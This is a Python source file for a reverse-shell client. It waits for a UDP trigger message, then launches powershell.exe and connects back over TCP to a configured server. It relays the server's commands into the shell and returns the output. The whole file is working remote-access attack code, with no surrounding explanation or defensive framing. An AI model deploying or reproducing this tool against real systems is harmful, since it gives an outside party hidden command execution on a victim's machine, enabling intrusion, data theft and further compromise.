from socket import socket, AF_INET, SOCK_STREAM, SOCK_DGRAM
from subprocess import Popen, PIPE, STDOUT
from multiprocessing import Process, Value
from threading import Thread
from Host import Host


def worker(ip: str, port: int, interrupt: Value):
    server = socket(AF_INET, SOCK_STREAM)
    interrupt = interrupt
    shell = Popen(
            ["powershell.exe"],
            stdout=PIPE,
            stderr=STDOUT,
            stdin=PIPE,
            shell=True,
            text=True
    )
    print(f'shell pid: {shell.pid}')
    server.connect((ip, port))

    def s2p(s, p):
        try:
            while True:
                data = s.recv(1024).decode()
                if len(data) > 0:
                    print(f'received from sever:{data}')
                    p.stdin.write(f'{data}\n')
                    p.stdin.flush()
        except ConnectionError:
            interrupt.value = 1

    def p2s(s, p):
        try:
            while True:
                data = p.stdout.readline().encode()
                if len(data) > 0:
                    print(f'sent to sever:{data}')
                    s.sendall(data)
        except ConnectionError:
            interrupt.value = 1

    Thread(target=s2p, args=(server, shell)).start()
    Thread(target=p2s, args=(server, shell)).start()


class Client:
    def __init__(self, server: Host):
        self.server = server
        print(
                f'Bound to server:\n'
                f'\tip: {self.server.ip}\n'
                f'\tmain_port: {self.server.main_port}\n'
                f'\tsub_port: {self.server.sub_port}\n'
        )

    def listen(self):
        print('Started Listening')
        sub_socket = socket(AF_INET, SOCK_DGRAM)  # use UDP to judge whether to transport the shell
        sub_socket.bind((self.server.ip, self.server.sub_port))
        while True:
            try:
                msg = sub_socket.recv(1024)
                print(f'received message: {msg}')
                if msg == b'shell':
                    self._reverse_shell()
            except Exception as e:
                print(e)

    def _reverse_shell(self):
        interrupt = Value('b', 0)
        proc = Process(
                target=worker,
                args=(self.server.ip, self.server.main_port, interrupt)
        )
        proc.start()
        print('Shell activated')
        while not interrupt.value:
            pass
        proc.kill()
        print('Shell terminated')


if __name__ == '__main__':
    remote_server = Host(
            ip="localhost",
            main_port=36555,
            sub_port=36556
    )
    client = Client(remote_server)
    client.listen()
